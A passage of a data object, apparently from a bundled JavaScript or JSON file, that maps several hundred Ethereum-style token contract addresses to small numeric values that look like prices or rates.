                "0xc77b230f31b517f1ef362e59c173c2be6540b5e8": 6.97e-8,
                "0x8c088775e4139af116ac1fa6f281bbf71e8c1c73": 249004e-10,
                "0xdecf7be29f8832e9c2ddf0388c9778b8ba76af43": 2.007e-7,
                "0x614d7f40701132e25fe6fc17801fbd34212d2eda": 0,
                "0x0f71b8de197a1c84d31de0f1fa7926c365f052b3": 428091e-10,
                "0x3b9e094d56103611f0acefdab43182347ba60df4": 9.308e-7,
                "0x41a3dba3d677e573636ba691a70ff2d606c29666": 326484e-10,
                "0x51db5ad35c671a87207d88fc11d593ac0c8415bd": 320474e-10,
                "0x48c1b2f3efa85fbafb2ab951bf4ba860a08cdbb7": 1.01e-8,
                "0x68b1cadb8d5ab0c97fe9d9fbe0eb60acb329fe3f": 627584e-10,
                "0x69fa0fee221ad11012bab0fdb45d444d3d2ce71c": 77415e-10,
                "0xcb8fb2438a805664cd8c3e640b85ac473da5be87": 50045e-10,
                "0x88a9a52f944315d5b4e917b9689e65445c401e83": 952122e-10,
                "0x8888801af4d980682e47f1a9036e589479e835c5": .0013287597,
                "0x9dfad1b7102d46b1b197b90095b5c4e9f5845bba": 275927e-10,
                "0x001a8ffcb0f03e99141652ebcdecdb0384e3bd6c": 42033e-10,
                "0x990f341946a3fdb507ae7e52d17851b87168017c": .0044382026,
                "0x725440512cb7b78bf56b334e50e31707418231cb": 2.45e-8,
                "0x89551b940e2a8ed8eccf509935bac9213fe30584": 32552e-10,
                "0xa0008f510fe9ee696e7e320c9e5cbf61e27791ee": 1.207e-7,
                "0x34364bee11607b1963d66bca665fde93fca666a8": 10681e-10,
                "0x36f3fd68e7325a35eb768f1aedaae9ea0689d723": 13077e-10,
                "0xc0ba369c8db6eb3924965e5c4fd0b4c1b91e305f": 184626e-10,
                "0x307d45afbb7e84f82ef3d251a6bb0f00edf632e4": 25487e-10,
                "0x493cbbd4a5da462e3dbc3e5c8e2a1e37d1d03cac": 47602e-10,
                "0x91dfbee3965baaee32784c2d546b7a0c62f268c9": 54656e-10,
                "0x5eeaa2dcb23056f4e8654a349e57ebe5e76b5e6e": 53019e-10,
                "0x79650799e7899a802cb96c0bc33a6a8d4ce4936c": 10515e-10,
                "0xdb05ea0877a2622883941b939f0bb11d1ac7c400": 69532e-10,
                "0x6e8908cfa881c9f6f2c64d3436e7b80b1bf0093f": 127811e-10,
                "0x8a9c67fee641579deba04928c4bc45f66e26343a": 191677e-10,
                "0x60eb57d085c59932d5faa6c6026268a4386927d0": 110011e-10,
                "0xed91879919b71bb6905f23af0a68d231ecf87b14": 10992e-9,
                "0x56015bbe3c01fe05bc30a8a9a9fd9a88917e7db3": 842552e-10,
                "0x054f76beed60ab6dbeb23502178c52d6c5debe40": 42634e-10,
                "0xaecc217a749c2405b5ebc9857a16d58bdc1c367f": 5.454e-7,
                "0xfa3118b34522580c35ae27f6cf52da1dbb756288": 5.405e-7,
                "0x147faf8de9d8d8daae129b187f0d02d819126750": 65302e-10,
                "0xd794dd1cada4cf79c9eebaab8327a1b0507ef7d4": 208919e-10,
                "0xcbcc0f036ed4788f63fc0fee32873d6a7487b908": 28821e-10,
                "0x6bd361e10c1afed0d95259e7c0115f3a60e4ea99": 133813e-10,
                "0x70401dfd142a16dc7031c56e862fc88cb9537ce0": .0055925678,
                "0x103c3a209da59d3e7c4a89307e66521e081cfdf0": .0001195294,
                "0x31fdd1c6607f47c14a2821f599211c67ac20fa96": 26947e-10,
                "0x2d80f5f5328fdcb6eceb7cacf5dd8aedaec94e20": 476941e-10,
                "0x8ffe40a3d0f80c0ce6b203d5cdc1a6a86d9acaea": 5.84e-8,
                "0xea097a2b1db00627b2fa17460ad260c016016977": 213279e-10,
                "0x6781a0f84c7e9e846dcb84a9a5bd49333067b104": 21596e-10,
                "0x846c66cf71c43f80403b51fe3906b3599d63336f": 16e-9,
                "0xada62f7ccd6af6cacff04accbc4f56f3d4ffd4ef": 10137e-10,
                "0xea3983fc6d0fbbc41fb6f6091f68f3e08894dc06": 77562e-10,
                "0xd49ff13661451313ca1553fd6954bd1d9b6e02b9": 9.176e-7,
                "0xad32a8e6220741182940c5abf610bde99e737b2d": 328606e-10,
                "0x4fbb350052bca5417566f188eb2ebce5b19bc964": .0001798353,
                "0xbdfa65533074b0b23ebc18c7190be79fa74b30c2": 893403e-10,
                "0xae1eaae3f627aaca434127644371b67b18444051": 242497e-10,
                "0x888888888889c00c67689029d7856aac1065ec11": .0001138716,
                "0xcdeee767bed58c5325f68500115d4b722b3724ee": 143127e-10,
                "0x9f5f3cfd7a32700c93f971637407ff17b91c7342": 10711e-10,
                "0x3907e6ff436e2b2b05d6b929fb05f14c0ee18d90": 14596e-10,
                "0x4a8f5f96d5436e43112c2fbc6a9f70da9e4e16d4": .0004197663,
                "0x8eef5a82e6aa222a60f009ac18c24ee12dbf4b41": 69673e-10,
                "0x41dbecc1cdc5517c6f76f6a6e836adbee2754de3": 14463e-10,
                "0x38a2fdc11f526ddd5a607c1f251c065f40fbf2f7": 6227e-9,
                "0x6595b8fd9c920c81500dca94e53cdc712513fb1f": 3.481e-7,
                "0x5d30ad9c6374bf925d0a75454fa327aacf778492": 541452e-10,
                "0x4092678e4e78230f46a1534c0fbc8fa39780892b": 5.67e-8,
                "0x3166c570935a7d8554c8f4ea792ff965d2efe1f2": .0017123696,
                "0xe7f58a92476056627f9fdb92286778abd83b285f": .0001341389,
                "0xd7dcd9b99787c619b4d57979521258d1a7267ad7": 111336e-10,
                "0x6fc13eace26590b80cccab1ba5d51890577d83b2": 60145e-10,
                "0x8db1d28ee0d822367af8d220c0dc7cb6fe9dc442": 22326e-10,
                "0x06a00715e6f92210af9d7680b584931faf71a833": 214082e-10,
                "0xa456b515303b2ce344e9d2601f91270f8c2fea5e": 303171e-10,
                "0xb1e9157c2fdcc5a856c8da8b2d89b6c32b3c1229": 68388e-10,
                "0x7fa7df4996ac59f398476892cfb195ed38543520": 81868e-10,
                "0xb0e1fc65c1a741b4662b813eb787d369b8614af1": 734154e-10,
                "0x03b155af3f4459193a276395dd76e357bb472da1": 8.562e-7,
                "0x6f87d756daf0503d08eb8993686c7fc01dc44fb1": 223353e-10,
                "0x7bef710a5759d197ec0bf621c3df802c2d60d848": 152861e-10,
                "0x488e0369f9bc5c40c002ea7c1fe4fd01a198801c": 435718e-10,
                "0xe8ff5c9c75deb346acac493c463c8950be03dfba": 16379e-10,
                "0x9d86b1b2554ec410eccffbf111a6994910111340": 3.997e-7,
                "0x9f9c8ec3534c3ce16f928381372bfbfbfb9f4d24": 12169e-10,
                "0x28cb7e841ee97947a86b06fa4090c8451f64c0be": .0075139961,
                "0xc0eb85285d83217cd7c891702bcbc0fc401e2d9d": 8.183e-7,
                "0x6fe56c0bcdd471359019fcbc48863d6c3e9d4f41": 7.916e-7,
                "0x24a6a37576377f63f194caa5f518a60f45b42921": .0016157239,
                "0x6bc1f3a1ae56231dbb64d3e82e070857eae86045": 8.75e-8,
                "0x558ec3152e2eb2174905cd19aea4e34a23de9ad6": 45644e-10,
                "0x0e29e5abbb5fd88e28b2d355774e73bd47de3bcd": 10386e-10,
                "0x687bfc3e73f6af55f0ccca8450114d107e781a0e": 122766e-10,
                "0x78b039921e84e726eb72e7b1212bb35504c645ca": 196055e-10,
                "0x00d8318e44780edeefcf3020a5448f636788883c": 24269e-10,
                "0x0c93b616933b0cd03b201b29cd8a22681dd9e0d9": 868703e-10,
                "0x78b7fada55a64dd895d8c8c35779dd8b67fa8a05": 72492e-10,
                "0x7995ab36bb307afa6a683c24a25d90dc1ea83566": 6.4e-9,
                "0xb70835d7822ebb9426b56543e391846c107bd32c": 5.122e-7,
                "0x07150e919b4de5fd6a63de1f9384828396f25fdc": .0008073671,
                "0x63b4f3e3fa4e438698ce330e365e831f7ccd1ef4": .0001608437,
                "0x939b462ee3311f8926c047d2b576c389092b1649": 5.339e-7,
                "0x09ccd2da5dcdd0510268d4979e792381337138b8": 53884e-10,
                "0x358aa737e033f34df7c54306960a38d09aabd523": 16275e-10,
                "0x0f8c45b896784a1e408526b9300519ef8660209c": 13e-9,
                "0xbc46d9961a3932f7d6b64abfdec80c1816c4b835": 1.873e-7,
                "0x910dfc18d6ea3d6a7124a6f8b5458f281060fa4c": 44572e-10,
                "0x9b5c2be869a19e84bdbcb1386dad83a2ec8dae82": 12896e-10,
                "0x228ba514309ffdf03a81a205a6d040e429d6e80c": 771e-9,
                "0x20a8cec5fffea65be7122bcab2ffe32ed4ebf03a": 106899e-10,
                "0x9aeb50f542050172359a0e1a25a9933bc8c01259": 110279e-10,
                "0x048fe49be32adfc9ed68c37d32b5ec9df17b3603": 3.556e-7,
                "0x5872e64c3f93363822d2b1e4717be3398fdcea51": 36081e-10,
                "0x9040e237c3bf18347bb00957dc22167d0f2b999d": 268457e-10,
                "0x515d7e9d75e2b76db60f8a051cd890eba23286bc": .0001239011,
                "0x179e31fb25e433441a2839389a7b8ec9c4654b7b": 44883e-10,
                "0xd528cf2e081f72908e086f8800977df826b5a483": 6.917e-7,
                "0x95a4492f028aa1fd432ea71146b433e7b4446611": 52695e-10,
                "0x066798d9ef0833ccc719076dab77199ecbd178b0": 34047e-10,
                "0x7968bc6a03017ea2de509aaa816f163db0f35148": .0001974485,
                "0xc741f06082aa47f93729070ad0dd95e223bda091": 14507e-10,
                "0x5d4abc77b8405ad177d8ac6682d584ecbfd46cec": 65124e-10,
                "0x32d74896f05204d1b6ae7b0a3cebd7fc0cd8f9c7": 7.631e-7,
                "0x1735db6ab5baa19ea55d0adceed7bcdc008b3136": 122625e-10,
                "0x514cdb9cd8a2fb2bdcf7a3b8ddd098caf466e548": 0,
                "0x69b148395ce0015c13e36bffbad63f49ef874e03": 2.93e-8,
                "0xa2881f7f441267042f9778ffa0d4f834693426be": 323617e-10,
                "0x4cf488387f035ff08c371515562cba712f9015d4": 4.852e-7,
                "0xf51ebf9a26dbc02b13f8b3a9110dac47a4d62d78": 25669e-10,
                "0x5aaefe84e0fb3dd1f0fcff6fa7468124986b91bd": 226578e-10,
                "0x054d64b73d3d8a21af3d764efd76bcaa774f3bb2": 26803e-10,
                "0xcae72a7a0fd9046cf6b165ca54c9e3a3872109e0": 17439e-10,
                "0xf88951d7b676798705fd3a362ba5b1dbca2b233b": 5.838e-7,
                "0xf278c1ca969095ffddded020290cf8b5c424ace2": 33e-8,
                "0x859a9c0b44cb7066d956a958b0b82e54c9e44b4b": 177605e-10,
                "0x1cd2528522a17b6be63012fb63ae81f3e3e29d97": 0,
                "0xfc2c4d8f95002c14ed0a7aa65102cac9e5953b5e": 153496e-10,
                "0x8f0921f30555624143d427b340b1156914882c10": 180282e-10,
                "0xa58a4f5c4bb043d2cc1e170613b74e767c94189b": 25497e-10,
                "0xe0c8b298db4cffe05d1bea0bb1ba414522b33c1b": 126818e-10,
                "0x4674a4f24c5f63d53f22490fb3a08eaaad739ff8": 7821e-9,
                "0x8a77e40936bbc27e80e9a3f526368c967869c86d": 7.21e-8,
                "0xa7de087329bfcda5639247f96140f9dabe3deed1": 39883e-10,
                "0xfc05987bd2be489accf0f509e44b0145d68240f7": 2.197e-7,
                "0x6c2adc2073994fb2ccc5032cc2906fa221e9b391": 49883e-10,
                "0xff603f43946a3a28df5e6a73172555d8c8b02386": 10861e-10,
                "0xa4bdb11dc0a2bec88d24a3aa1e6bb17201112ebe": .0006660408,
                "0x4290563c2d7c255b5eec87f2d3bd10389f991d68": 2e-7,
                "0x0f7f961648ae6db43c75663ac7e5414eb79b5704": 83495e-10,
                "0x578b49c45961f98d8df92854b53f1641af0a5036": 4.374e-7,
                "0xe1c7e30c42c24582888c758984f6e382096786bd": 302051e-10,
                "0x2c9c19ce3b15ae77c6d80aec3c1194cfd6f7f3fa": 19598e-10,
                "0x2620638eda99f9e7e902ea24a285456ee9438861": 29427e-10,
                "0xff19138b039d938db46bdda0067dc4ba132ec71c": 12301e-10,
                "0xd559f20296ff4895da39b5bd9add54b442596a61": 30896e-10,
                "0x77c07555af5ffdc946fb47ce15ea68620e4e7170": 16236e-10,
                "0x543ff227f64aa17ea132bf9886cab5db55dcaddf": 58578e-10,
                "0x5a666c7d92e5fa7edcb6390e4efd6d0cdd69cf37": 400541e-10,
                "0x6368e1e18c4c419ddfc608a0bed1ccb87b9250fc": 2.306e-7,
                "0xc813ea5e3b48bebeedb796ab42a30c5599b01740": 2961e-9,
                "0x5eaa69b29f99c84fe5de8200340b4e9b4ab38eac": 23419e-10,
                "0x66186008c1050627f979d464eabb258860563dbe": 2.114e-7,
                "0xdf96bde075d59e9143b325c75af38e208c986e6f": 0,
                "0xb17548c7b510427baac4e267bea62e800b247173": 83341e-10,
                "0x10be9a8dae441d276a5027936c3aaded2d82bc15": 283519e-10,
                "0xb31ef9e52d94d4120eb44fe1ddfde5b4654a6515": 52403e-10,
                "0x2ccbff3a042c68716ed2a2cb0c544a9f1d1935e1": 47546e-10,
                "0x4fb721ef3bf99e0f2c193847afa296b9257d3c30": 20969e-10,
                "0x74fd51a98a4a1ecbef8cc43be801cce630e260bd": 1.21e-8,
                "0x2baac9330cf9ac479d819195794d79ad0c7616e3": 2.962e-7,
                "0x3a1bda28adb5b0a812a7cf10a1950c920f79bcd3": 47992e-10,
                "0x661ab0ed68000491d98c796146bcf28c20d7c559": 10081e-9,
                "0xa6446d655a0c34bc4f05042ee88170d056cbaf45": 5.894e-7,
                "0x13c2fab6354d3790d8ece4f0f1a3280b4a25ad96": 44942e-9,
                "0x3136ef851592acf49ca4c825131e364170fa32b3": 12114e-10,
                "0xf4d861575ecc9493420a3f5a14f85b13f0b50eb3": 156499e-10,
                "0x06e0feb0d74106c7ada8497754074d222ec6bcdf": 4.229e-7,
                "0x2396fbc0e2e3ae4b7206ebdb5706e2a5920349cb": 18668e-10,
                "0x7dbdd9dafdc4c1c03d67925a4f85daa398af32b0": 9.283e-7,
                "0x8a74bc8c372bc7f0e9ca3f6ac0df51be15aec47a": 15354e-10,
                "0x9b39a0b97319a9bd5fed217c1db7b030453bac91": 45394e-10,
                "0xaa19961b6b858d9f18a115f25aa1d98abc1fdba8": 52123e-10,
                "0x3505f494c3f0fed0b594e01fa41dd3967645ca39": 32075e-10,
                "0xaec7d1069e3a914a3eb50f0bfb1796751f2ce48a": 2.765e-7,
                "0x2c4e8f2d746113d0696ce89b35f0d8bf88e0aeca": 3.091e-7,
                "0x667088b212ce3d06a1b553a7221e1fd19000d9af": 24466e-10,
                "0xfeea0bdd3d07eb6fe305938878c0cadbfa169042": 40753e-10,
                "0x80ce3027a70e0a928d9268994e9b85d03bd4cdcf": 94015e-10,
                "0x8e30ea2329d95802fd804f4291220b0e2f579812": 4.551e-7,
                "0x63f584fa56e60e4d0fe8802b27c7e6e3b33e007f": 1.379e-7,
                "0x6e765d26388a17a6e86c49a8e41df3f58abcd337": 2.4e-9,
                "0x4c6ec08cf3fc987c6c4beb03184d335a2dfc4042": 26e-9,
                "0x12513335ffd5dafc2334e98625d27c1ca84bff86": 9.354e-7,
                "0x3a82d3111ab5faf39d847d46023d9090261a658f": 29636e-10,
                "0x00059ae69c1622a7542edc15e8d17b060fe307b6": 278e-9,
                "0xff75ced57419bcaebe5f05254983b013b0646ef5": 2.662e-7,
                "0xdf347911910b6c9a4286ba8e2ee5ea4a39eb2134": 12589e-10,
                "0x7e9e431a0b8c4d532c745b1043c7fa29a48d4fba": 3.492e-7,
                "0x62dc4817588d53a056cbbd18231d91ffccd34b2a": 573904e-10,
                "0x6a7260e44789aef24fdaf72d80ecdc253aaa079e": .0001533469,
                "0x58f9102bf53cf186682bd9a281d3cd3c616eec41": 129774e-10,
                "0xcf78c7dd70d6f30f6e3609e905e78305da98c863": 693394e-10,
                "0x9f284e1337a815fe77d2ff4ae46544645b20c5ff": .0052905982,
                "0xfffffffff15abf397da76f1dcc1a1604f45126db": 60739e-10,
                "0x5caf454ba92e6f2c929df14667ee360ed9fd5b26": .0002027918,
                "0x7fbec0bb6a7152e77c30d005b5d49cbc08a602c3": 329362e-10,
                "0x657b83a0336561c8f64389a6f5ade675c04b0c3b": 60515e-10,
                "0x89020f0d5c5af4f3407eb5fe185416c457b0e93e": 3.691e-7,
                "0x21381e026ad6d8266244f2a583b35f9e4413fa2a": 2756e-9,
                "0x8d75959f1e61ec2571aa72798237101f084de63a": 566e-9,
                "0xf14922001a2fb8541a433905437ae954419c2439": 9.624e-7,
                "0xd7394087e1dbbe477fe4f1cf373b9ac9459565ff": 2.03e-8,
                "0xbebdab6da046bc49ffbb61fbd7b33157eb270d05": 124979e-10,
                "0x76960dccd5a1fe799f7c29be9f19ceb4627aeb2f": 16168e-10,
                "0x00aba6fe5557de1a1d565658cbddddf7c710a1eb": 327137e-10,
                "0x1dea979ae76f26071870f824088da78979eb91c8": 5.14e-8,
                "0x3543638ed4a9006e4840b105944271bcea15605d": 2.08e-8,
                "0xdc5864ede28bd4405aa04d93e05a0531797d9d59": 5.25e-8,
                "0x4d2ee5dae46c86da2ff521f7657dad98834f97b8": .014757854,
                "0xf7413489c474ca4399eee604716c72879eea3615": 112942e-10,
                "0xe8663a64a96169ff4d95b4299e7ae9a76b905b31": 9.59e-8,
                "0xe1aee98495365fc179699c1bb3e761fa716bee62": 2.329e-7,
                "0x94236591125e935f5ac128bb3d5062944c24958c": 126337e-10,
                "0x0ea984e789302b7b612147e4e4144e64f21425eb": 1.01e-8,
                "0x4af328c52921706dcb739f25786210499169afe6": 7.81e-8,
                "0x827d53c8170af52625f414bde00326fc8a085e86": 6.792e-7,
                "0x73968b9a57c6e53d41345fd57a6e6ae27d6cdb2f": .0002826151,
                "0xb9e7f8568e08d5659f5d29c4997173d84cdf2607": 234323e-10,
                "0x9c2dc0c3cc2badde84b0025cf4df1c5af288d835": 8.758e-7,
                "0x635d081fd8f6670135d8a3640e2cf78220787d56": 240355e-10,
                "0x25b6325f5bb1c1e03cfbc3e53f470e1f1ca022e3": 16562e-10,
                "0x6bb61215298f296c55b19ad842d3df69021da2ef": .0001672249,
                "0xdd94842c15abfe4c9bafe4222ade02896beb064c": 111394e-10,
                "0xffe02ee4c69edf1b340fcad64fbd6b37a7b9e265": 1.01e-8,
                "0xf0bc1ae4ef7ffb126a8347d06ac6f8add770e1ce": .0001877399,
                "0xfe9a29ab92522d14fc65880d817214261d8479ae": .0003950106,
                "0x5c64031c62061865e5fd0f53d3cdaef80f72e99d": 1.85e-8,
                "0x3449fc1cd036255ba1eb19d65ff4ba2b8903a69a": 33693e-10,
                "0x727f064a78dc734d33eec18d5370aef32ffd46e4": 19287e-10,
                "0xffc63b9146967a1ba33066fb057ee3722221acf0": 52411e-10,
                "0x59e9261255644c411afdd00bd89162d09d862e38": 194305e-10,
                "0xea38eaa3c86c8f9b751533ba2e562deb9acded40": 1.819e-7,
                "0x549905519f9e06d55d7dfcd4d54817780f6b93e8": 11455e-10,
                "0x6704b673c70de9bf74c8fba4b4bd748f0e2190e1": 5.49e-8,
                "0x29cbd0510eec0327992cd6006e63f9fa8e7f33b7": 2.075e-7,
                "0x8a40c222996f9f3431f63bf80244c36822060f12": 19748e-10,
                "0xacbd826394189cf2623c6df98a18b41fc8ffc16d": 86864e-10,
                "0x946112efab61c3636cbd52de2e1392d7a75a6f01": 2128e-9,
                "0x3c03b4ec9477809072ff9cc9292c9b25d4a8e6c6": 17535e-10,
                "0x11613b1f840bb5a40f8866d857e24da126b79d73": 2.634e-7,
                "0xee4458e052b533b1aabd493b5f8c4d85d7b263dc": 10406e-10,
                "0x24e3794605c84e580eea4972738d633e8a7127c8": 162362e-10,
                "0x4bbbc57af270138ef2ff2c50dbfad684e9e0e604": 1.01e-8,
                "0x1beef31946fbbb40b877a72e4ae04a8d1a5cee06": 1.929e-7,
                "0x6b1a8f210ec6b7b6643cea3583fb0c079f367898": 829e-8,
                "0x7d14b842630cbc2530cb288109e5719e0c4d67d7": 8.647e-7,
                "0x4730fb1463a6f1f44aeb45f6c5c422427f37f4d0": 12709e-10,
                "0x1da01e84f3d4e6716f274c987ae4bee5dc3c8288": 70076e-10,
                "0xa1a36d3537bbe375cc9694795f663ddc8d516db9": 10396e-10,
                "0xb4fbed161bebcb37afb1cb4a6f7ca18b977ccb25": .0079873712,
                "0x1c1c14a6b5074905ce5d367b0a7e098b58ebfd47": 5.1e-9,
                "0x83984d6142934bb535793a82adb0a46ef0f66b6d": 1.573e-7,
                "0x47e67ba66b0699500f18a53f94e2b9db3d47437e": 1.567e-7,
                "0xe516d78d784c77d479977be58905b3f2b1111126": 3.044e-7,
                "0xd2d6158683aee4cc838067727209a0aaf4359de3": 6.658e-7,
                "0xa16a609ff4e1a15b6ccb469e7a5dd14e89305283": 187825e-10,
                "0xc57d533c50bc22247d49a368880fb49a1caa39f7": 65923e-10,
                "0xc538143202f3b11382d8606aae90a96b042a19db": 1.153e-7,
                "0xaad54c9f27b876d2538455dda69207279ff673a5": 1.78e-8,
                "0xeaf61fc150cd5c3bea75744e830d916e60ea5a9f": 9.27e-8,
                "0x47b28f365bf4cb38db4b6356864bde7bc4b35129": 6.15e-8,
                "0x3832d2f059e55934220881f831be501d180671a7": 47136e-9,
                "0xd8e3fb3b08eba982f2754988d70d57edc0055ae6": .026024433,
                "0xf3db5fa2c66b7af3eb0c0b782510816cbe4813b8": 62625e-10,
                "0xeda8b016efa8b1161208cf041cd86972eee0f31e": 1.433e-7,
                "0x5d3a4f62124498092ce665f865e0b38ff6f5fbea": 86859e-10,
                "0x09970aec766b6f3223aca9111555e99dc50ff13a": 10868e-10,
                "0x998b3b82bc9dba173990be7afb772788b5acb8bd": 7.8e-9,
                "0x0a2d9370cf74da3fd3df5d764e394ca8205c50b6": .0001458484,
                "0xa150db9b1fa65b44799d4dd949d922c0a33ee606": 14e-8,
                "0xe0b9bcd54bf8a730ea5d3f1ffce0885e911a502c": 5.4e-9,
                "0x9a0aba393aac4dfbff4333b06c407458002c6183": 516712e-10,
                "0x0a913bead80f321e7ac35285ee10d9d922659cb7": 1008e-9,
                "0x14da7b27b2e0fedefe0a664118b0c9bc68e2e9af": 992059e-10,
                "0x1ccaa0f2a7210d76e1fdec740d5f323e2e1b1672": 2.915e-7,
                "0x69beab403438253f13b6e92db91f7fb849258263": 17284e-10,
                "0x23352036e911a22cfc692b5e2e196692658aded9": 2.636e-7,
                "0x006bea43baa3f7a6f765f14f10a1a1b08334ef45": 26508e-10,
                "0xeeee2a622330e6d2036691e983dee87330588603": 10137e-10,
                "0x86e44543164d9b97b14ef7f6f3ab7ba670cab346": 1.01e-8,
                "0xa10740ff9ff6852eac84cdcff9184e1d6d27c057": .0701242998,
                "0x44f262622248027f8e2a8fb1090c4cf85072392c": 39416e-10,
                "0x539efe69bcdd21a83efd9122571a64cc25e0282b": 3532e-9,
                "0x8c4e7f814d40f8929f9112c5d09016f923d34472": 4e-9,
                "0x9a257c90fa239fba07771ef7da2d554d148c2e89": 13788e-10,
                "0xe75ad3aab14e4b0df8c5da4286608dabb21bd864": 5.094e-7,
                "0xdd0020b1d5ba47a54e2eb16800d73beb6546f91a": 4.507e-7,
                "0x9af4f26941677c706cfecf6d3379ff01bb85d5ab": 2.128e-7,
                "0xa96f31f1c187c28980176c3a27ba7069f48abde4": 2.12e-8,
                "0x1dd80016e3d4ae146ee2ebb484e8edd92dacc4ce": 2.425e-7,
                "0x8ae4bf2c33a8e667de34b54938b0ccd03eb8cc06": 1746e-9,
                "0x33e07f5055173cf8febede8b21b12d1e2b523205": 39377e-10,
                "0xe95990825aab1a7f0af4cc648f76a3bcc99f25b2": 1.01e-8,
                "0xfca47962d45adfdfd1ab2d972315db4ce7ccf094": 33963e-10,
                "0xc36b4311b21fc0c2ead46f1ea6ce97c9c4d98d3d": 15496e-10,
                "0x26607ac599266b21d13c7acf7942c7701a8b699c": .0006020577,
                "0x8716fc5da009d3a208f0178b637a50f4ef42400f": 6.938e-7,
                "0xbb1f24c0c1554b9990222f036b0aad6ee4caec29": 369e-9,
                "0xcb94be6f13a1182e4a4b6140cb7bf2025d28e41b": 12795e-10,
                "0xe1a4c5bbb704a92599fedb191f451e0d3a1ed842": 372678e-10,
                "0xa249de6948022783765fee4850d7b85e43118fcc": 10642e-10,
                "0x943ed852dadb5c3938ecdc6883718df8142de4c8": 4.03e-8,
                "0x1c95b093d6c236d3ef7c796fe33f9cc6b8606714": .0001284091,
                "0x39795344cbcc76cc3fb94b9d1b15c23c2070c66d": 54424e-10,
                "0xb8e3bb633f7276cc17735d86154e0ad5ec9928c0": 85358e-10,
                "0x5925f67d2767d937f47141dac24166b469558222": 8.31e-8,
                "0xa2d77f8353cb2afd709aba4a967257511ecff716": 1.01e-8,
                "0x7a3d5d49d64e57dbd6fbb21df7202bd3ee7a2253": .0183971526,
                "0x37e8789bb9996cac9156cd5f5fd32599e6b91289": 2591e-9,
                "0x7475c42f8bf2c19f4eaf12feaababa859fdc8914": 5.762e-7,
                "0xe0b9a2c3e9f40cf74b2c7f591b2b0cca055c3112": 89088e-10,
                "0x20945ca1df56d237fd40036d47e866c7dccd2114": 183586e-10,
                "0xbba6c7c7d673c48d90069ad2e9d2fe587fcb6bc3": 165188e-10,
                "0xf04a8ac553fcedb5ba99a64799155826c136b0be": 12306e-10,
                "0xd341d1680eeee3255b8c4c75bcce7eb57f144dae": 25176e-10,
                "0xff44b937788215eca197baaf9af69dbdc214aa04": 126638e-10,
                "0x7eaf9c89037e4814dc0d9952ac7f888c784548db": 17642e-10,
                "0xfb444c1f2b718ddfc385cb8fd9f2d1d776b24668": 1.133e-7,
                "0x0922f1d808adc3a4444bed2f73fac53a1a2a5859": .0002524891,
                "0xc7bba5b765581efb2cdd2679db5bea9ee79b201f": 8.39e-8,
                "0xb8647e90c0645152fccf4d9abb6b59eb4aa99052": 374717e-10,
                "0x4674672bcddda2ea5300f5207e1158185c944bc0": 12015e-10,
                "0x8713d26637cf49e1b6b4a7ce57106aabc9325343": 2.6e-9,
                "0x3810a4ddf41e586fa0dba1463a7951b748cecfca": 72e-8,
                "0x159751323a9e0415dd3d6d42a1212fe9f4a0848c": 31332e-10,
                "0x3918c42f14f2eb1168365f911f63e540e5a306b5": 1.01e-8,
                "0xf21661d0d1d76d3ecb8e1b9f1c923dbfffae4097": 14611e-9,
                "0x3c6da7763caa0e4b684bbc733f04a8ec08af3762": 78791e-10,
                "0xea7cc765ebc94c4805e3bff28d7e4ae48d06468a": 214577e-10,
                "0xc0f9bd5fa5698b6505f643900ffa515ea5df54a9": 7.838e-7,
                "0x77dce26c03a9b833fc2d7c31c22da4f42e9d9582": 101342e-10,
                "0x60bb16c4a931b1a0b8a7d945c651dd90f41d42cf": 104173e-10,
                "0x89bd2e7e388fab44ae88bef4e1ad12b4f1e0911c": 97169e-10,
                "0xbe6c8f2810ef39420d2dc2901b8414c8c45fee6d": 5.1e-9,
                "0xf4cd3d3fda8d7fd6c5a500203e38640a70bf9577": .0229538672,
                "0x7a41e0517a5eca4fdbc7fbeba4d4c47b9ff6dc63": 7.79e-8,
                "0xa8b61cff52564758a204f841e636265bebc8db9b": 26772e-10,
                "0x1014613e2b3cbc4d575054d4982e580d9b99d7b1": 8.86e-8,
                "0x675bbc7514013e2073db7a919f6e4cbef576de37": 600089e-10,
                "0x734c90044a0ba31b3f2e640c10dc5d3540499bfd": 66262e-10,
                "0x026e62dded1a6ad07d93d39f96b9eabd59665e0d": 3.148e-7,
                "0x5c872500c00565505f3624ab435c222e558e9ff8": 4.6e-9,
                "0x06677dc4fe12d3ba3c7ccfd0df8cd45e4d4095bf": 23532e-10,
                "0xa6422e3e219ee6d4c1b18895275fe43556fd50ed": 21309e-10,
                "0x9a1bf361798ef6538ccb8137ea900c4d4b48ca3d": 713729e-10,
                "0xf8e386eda857484f5a12e4b5daa9984e06e73705": 22738e-10,
                "0xf70a642bd387f94380ffb90451c2c81d4eb82cbc": 454e-9,
                "0x6ff1bfa14a57594a5874b37ff6ac5efbd9f9599a": 138886e-10,
                "0x2730d6fdc86c95a74253beffaa8306b40fedecbb": 7.893e-7,
                "0x7c2e5b7ec572199d3841f6a38f7d4868bd0798f1": 1.01e-8,
                "0x3e3cda3218212503883c79f6d2feef29e6bbb87d": 82855e-10,
                "0xcb17cd357c7acd594717d899ecb9df540f633f27": 1766e-9,
                "0x12f649a9e821f90bb143089a6e56846945892ffb": 1.652e-7,
                "0x78c292d1445e6b9558bf42e8bc369271ded062ea": 5.2e-9,
                "0x8185bc4757572da2a610f887561c32298f1a5748": 21316e-10,
                "0x957891c11616d3e0b0a76a76fb42724c382e0ef3": 129616e-10,
                "0x2bba3cf6de6058cc1b4457ce00deb359e2703d7f": 6.1e-9,
                "0x922105fad8153f516bcfb829f56dc097a0e1d705": 5.73e-8,
                "0x7654915a1b82d6d2d0afc37c52af556ea8983c7e": 4.075e-7,
                "0x499a6b77bc25c26bcf8265e2102b1b3dd1617024": 13585e-10,
                "0xf0ee6b27b759c9893ce4f094b49ad28fd15a23e4": 55462e-10,
                "0x40986a85b4cfcdb054a6cbfb1210194fee51af88": 1996e-9,
                "0x87210f1d3422ba75b6c40c63c78d79324dabcd55": 1.01e-8,
                "0x8b40761142b9aa6dc8964e61d0585995425c3d94": 1.96e-8,
                "0x9ceb84f92a0561fa3cc4132ab9c0b76a59787544": .0014639935,
                "0x6006fc2a849fedaba8330ce36f5133de01f96189": .0959385894,
                "0x86772b1409b61c639eaac9ba0acfbb6e238e5f83": 851168e-10,
                "0x94804dc4948184ffd7355f62ccbb221c9765886f": 12806e-10,
                "0x9e04f519b094f5f8210441e285f603f4d2b50084": 9.911e-7,
                "0x9f195617fa8fbad9540c5d113a99a0a0172aaedc": 11445e-10,
                "0x8606a8f28e1e2fd50b9074d65c01548b1f040b32": 1.01e-8,
